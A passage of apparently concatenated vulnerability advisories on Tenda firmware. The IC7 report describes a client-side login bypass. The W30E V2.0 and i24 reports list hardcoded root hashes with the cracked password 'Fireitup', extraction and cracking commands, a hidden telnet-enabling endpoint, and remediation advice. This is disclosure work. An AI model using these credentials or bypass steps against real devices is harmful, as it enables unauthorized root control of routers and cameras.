[SESSION] userInfo = c3VwZXJfeWc6QW55dGhpbmdfMTIz  (Base64 -> super_yg:Anything_123)
[NAV] window.location.href = main.html?_V1
[CASE-OK] Unauthenticated pass-through (entered main page with 0 server authentications)
```

2. Case B — control, wrong password (`admin`/`WrongPass`): one `userCheck` request (`userName=admin&password=d75e4c8c…&encrypt=1&`), server answers HTTP 401, alert `LoginTips4`, no navigation — the normal authentication path still works.
3. Case C — control, correct password (`admin`/`Admin@123`): one `userCheck` request, HTTP 200, navigation to `main.html?_V1` — proving the mock server and the authentication chain are valid.

The A vs B/C contrast demonstrates that the authentication decision for `super_yg` happens entirely in the client with zero server involvement. The leakage chain is likewise demonstrated: `webPlayerPlay()` assembles `rtsp://super_yg:Anything_123@<device IP>:8554/profile0` from the Base64 cookie. Final verdict: `VERDICT SUCCESS`.

## Evidence

![Firmware hash verification, binwalk partition map, and asset info (IC7-L(P)RS, firmware 2209020910, SoC FH8852V2X0)](TendaIC7_images/fig1.png)

![extract/fw_version.txt device-identity proof: vendor TENDA, hw_name/model IC7-L(P)RS, build 2022-09-02T09:10](TendaIC7_images/fig2.png)

![qemu component-load trace plus PoC Case A (super_yg, 0 userCheck requests, jump to main.html) and Case B (401)](TendaIC7_images/fig3.png)

![PoC Case C (valid login path), the rtsp credential-concatenation leak chain, and the A/B/C verdict summary](TendaIC7_images/fig4.png)

## Impact

Anyone on the network can bypass the login page by typing `super_yg`, reaching the main and configuration views without server authentication, and the web client retains the `username:password` pair Base64-encoded in long-lived cookies (365 days) and in cleartext RTSP URLs — recoverable by an attacker with cookie access. A recovered administrator password can then be used against all PSIA/RTSP/ONVIF interfaces of the camera.

## Remediation Suggestions

Per the report's recommendations:

1. Delete the `if($("#UserName").val()=="super_yg"){jumpPage();return}` branch in `login.js`; make the server's `/PSIA/YG/userCheck` response the sole login decision.
2. Remove the `super_yg` permission-query skip in `common.js`; authorize accounts only server-side.
3. Stop storing `username:password` Base64-encoded in cookies; issue server-side opaque session tokens (HttpOnly, Secure, SameSite) with short lifetimes.
4. Do not build stream URLs from client-side passwords; have the server issue time-limited RTSP authentication tickets.
5. Enforce HTTPS site-wide, avoid cleartext credentials over RTSP/HTTP, and send passwords as salted slow hashes.
6. Add front-end code auditing rules to CI that block any client-side hardcoded accounts or client-side authentication branches.

## References

- Firmware download (official vendor link found in the package): `https://static.tenda.com.cn/tdcweb/download/uploadfile/IC7-PRS/IC7-PRS%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6.zip` — analyzed image `IC7-PRS升级软件.zip` (SHA-256 `22351305a802fcb980e92afe65abfcd6fe1202fdba4f9c2a16f8160585360d38`)

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda W30E V2.0 V16.01.0.19: /etc_ro/passwd Hardcoded Root Credentials (Pre-Auth, Root Shell via Telnet)
content:
# Tenda W30E V2.0 V16.01.0.19: /etc_ro/passwd Hardcoded Root Credentials (Pre-Auth, Root Shell via Telnet)

## Vulnerability Type / CWE

- **CWE-798**: Use of Hard-coded Credentials
- **Vulnerability Type**: Hardcoded root credential baked into the read-only firmware partition (attack vector: network, no authentication required)

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda |
| Product | W30E V2.0 High-Power Router (W30EV2.0br) |
| Model | W30E V2.0 |
| Firmware filename & version | US_W30EV2.0br_V16.01.0.19(5037)_CN-and-EN_TDC01-and-TDE01_HighPower.zip — V16.01.0.19(5037), compiled 2025-01-08 12:02:43 |
| Severity | High |
| Component | `/etc_ro/passwd`, `/etc_ro/shadow` (SquashFS read-only partition) |

Firmware SHA-256: `2b82ae923e3dad3bb0bfd2909a3a770b1511a0d56876774b93926baa2c1a24ab`
MD5: `8fe47ef063ab2ef0915a7b16bbd88f9a`
Architecture: ARM 32-bit Little Endian (EABI5); filesystem SquashFS (xz compressed).

## Vulnerability Description

Tenda W30E V2.0 firmware V16.01.0.19(5037) hardcodes the root user's password hash in the read-only filesystem files `/etc_ro/passwd` and `/etc_ro/shadow`. Both files store the hash with the MD5-crypt (`$1$`) algorithm:

- `/etc_ro/passwd`: `root:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1:0:0:root:/:/bin/sh` (salt `nalENqL8`)
- `/etc_ro/shadow`: `root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::` (salt `OVhtCyFa`)

Dictionary attacks crack both hashes in seconds; the plaintext password is **`Fireitup`**. Because the hash is baked into the read-only partition, every W30E V2.0 device running this firmware version shares the same root password, and users cannot change the underlying system password. When a device's Telnet service is enabled, an attacker can log in with this hardcoded password and obtain a root shell, taking complete control of the router. The weak MD5-crypt algorithm further aggravates the exposure.

## Root Cause Analysis

The vulnerable artifacts are the authentication files of the read-only partition, together with the boot script that reinstalls them on every start:

```text
# /etc_ro/passwd (line 1)
root:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1:0:0:root:/:/bin/sh

# /etc_ro/shadow (line 1)
root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::

# /etc_ro/init.d/rcS (relevant line)
cp -rf /etc_ro/* /etc/
```

Audit findings from the report:

1. `rcS` copies `/etc_ro/*` into `/var/etc/` (the actual mount point of `/etc`) at every boot. Although runtime `/etc/` is writable ramfs, the root password is reset to the firmware-baked value after each reboot, so any change is non-persistent.
2. Both hashes use MD5-crypt (`$1$` prefix), a legacy algorithm considered unsafe and quickly brute-forced.
3. The password is fixed across the whole fleet: an attacker who downloads the firmware once can extract the hash and use the recovered password against every device of the same model and firmware version.

## Exploitation

### Preconditions

- No authentication is required to recover the credential: the hash ships inside the publicly distributed firmware image.
- For an interactive root shell, the device's Telnet service must be enabled (the report states the attacker logs in with the hardcoded password when Telnet is on).

### Steps

1. Verify firmware integrity and unpack:

```bash
sha256sum ./US_W30EV2.0br_V16.01.0.19\(5037\)_CN-and-EN_TDC01-and-TDE01_HighPower.zip
bash ./extract_firmware.sh
```

2. Display firmware version information (device-identity proof):

```bash
cat ./extract_fw/_*/squashfs-root/etc_ro/prodversion.cfg ./extract_fw/_*/squashfs-root/etc_ro/fireversion.cfg
# V16.01.0.19(5037) ... [product ] W30EV2.0 (lang=cn)
```

3. Load the firmware httpd under qemu-arm user-mode emulation to confirm the image parses its passwd/shadow files, then read and crack the hardcoded hashes:

```bash
cat ./extract_fw/_*/squashfs-root/etc_ro/passwd ./extract_fw/_*/squashfs-root/etc_ro/shadow
python3 ./crack_passwd.py
```

4. Expected output — `[VERDICT SUCCESS] Root password confirmed: Fireitup`, with both hashes recomputed identically by Python's `crypt` module:

```text
File: /etc_ro/passwd
  Hash:     $1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1
  Password: Fireitup
  Computed: $1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1
  Match:    YES - CONFIRMED

File: /etc_ro/shadow
  Hash:     $1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1
  Password: Fireitup
  Computed: $1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1
  Match:    YES - CONFIRMED

[VERDICT SUCCESS] Root password confirmed: Fireitup
[*] All devices with this firmware share the same password
```

## Evidence

![Firmware SHA-256 verification and binwalk extraction of the W30E V2.0 HighPower image (V16.01.0.19(5037))](TendaW30E_images/fig1.png)

![prodversion.cfg / fireversion.cfg proving product W30EV2.0 and software V16.01.0.19(5037)](TendaW30E_images/fig2.png)

![/etc_ro/passwd and /etc_ro/shadow contents showing the hardcoded root MD5-crypt hashes](TendaW30E_images/fig3.png)

![crack_passwd.py output: both hashes recomputed to Fireitup, VERDICT SUCCESS](TendaW30E_images/fig4.png)

## Impact

All devices running this firmware share an identical root password that users cannot remove or rotate. Any attacker with network reachability to a Telnet-enabled device can authenticate as `root` and obtain a full root shell — arbitrary configuration changes, credential theft, malware persistence, and pivoting into the network behind the router. Even without Telnet, the credential weakens every authentication surface that consults the system account database.

## Remediation Suggestions

Per the report's recommendations:

1. Remove the hardcoded password: the build process must not preset a fixed hash in `/etc_ro/passwd` and `/etc_ro/shadow`; require the user to set a system password at first boot, or generate a random initial password derived from the device's unique identifier (e.g. MAC address).
2. Upgrade the hash algorithm from MD5-crypt (`$1$`) to SHA-512-crypt (`$6$`) or bcrypt to raise brute-forcing cost.
3. Link password changes: the web UI password change must update the underlying Linux system account password in sync.
4. Restrict management-service exposure: keep Telnet/SSH disabled by default, enable only on explicit user request, and bind to the LAN interface.
5. Upgrade firmware: users should watch for official Tenda firmware updates that fix this issue.

## References

- Firmware download (official vendor link found in the package): `https://static.tenda.com.cn/doc/2025/02/25/b20631261fa54d29b3a631e5d47b6d85/US_W30EV2.0br_V16.01.0.19(5037)_CN-and-EN_TDC01-and-TDE01_HighPower.zip` — analyzed image `US_W30EV2.0br_V16.01.0.19(5037)_CN-and-EN_TDC01-and-TDE01_HighPower.zip` (SHA-256 `2b82ae923e3dad3bb0bfd2909a3a770b1511a0d56876774b93926baa2c1a24ab`)

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda i24 V3.0.0.8: /etc_ro/passwd Hardcoded Root Credentials (Pre-Auth, Root Access)
content:
# Tenda i24 V3.0.0.8: /etc_ro/passwd Hardcoded Root Credentials (Pre-Auth, Root Access)

## Vulnerability Type / CWE

- **CWE-798**: Use of Hard-coded Credentials
- **Vulnerability Type**: Hardcoded root password baked into the read-only firmware partition, shared by every device running the firmware version

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda |
| Product | i24 Wireless AP/Router (V3.0si hardware family) |
| Model | i24 V3.0 |
| Firmware filename & version | US_i24V3.0si_V3.0.0.8(4008)_CN&EN_TDC01&TDE01.zip — version V3.0.0.8(4008) |
| Severity | High |
| Component | `/etc_ro/passwd`, `/etc_ro/shadow` (SquashFS read-only partition); secondary: `/webroot_ro/default.cfg` |

Firmware SHA-256: `e8a3369f5c62a7371656068c0a91ddac4f7568f5cfac2d2bd87c86756819fa00`
MD5: `2eac8c23428fd7a1f3a38a57738c01a3`

## Vulnerability Description

The Tenda i24 V3.0 firmware V3.0.0.8(4008) ships a hardcoded root user password inside its read-only filesystem. `/etc_ro/passwd` contains the MD5 crypt hash `$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1` for the `root` account, which offline cracking confirmed to be the plaintext `Fireitup`. Because the hash lives in the SquashFS read-only partition, users cannot change it, and every device running this firmware version shares the same root password.

Additionally, the default configuration file `/webroot_ro/default.cfg` contains `sys.baseuserpass=dXNlcg==` (Base64 for `user`), used as a base password in parts of the web-management authentication flow.

An attacker can leverage these hardcoded credentials in three ways described by the report:

1. Start `telnetd` through the hidden `/goform/telnet` interface, then log in as `root:Fireitup` to obtain a root shell.
2. Log in to the web management interface with the default password `user`, obtaining full administrative control.
3. Combine the default password with a command-injection vulnerability to execute arbitrary commands after authentication.

## Root Cause Analysis

The credential material is embedded in two firmware files of the read-only partition:

```text
# /etc_ro/passwd (SquashFS read-only partition)
root:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1:0:0:root:/root:/bin/sh

# /etc_ro/shadow (SquashFS read-only partition)
root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:::::::

# /webroot_ro/default.cfg (default configuration)
sys.username=
sys.userpass=
```
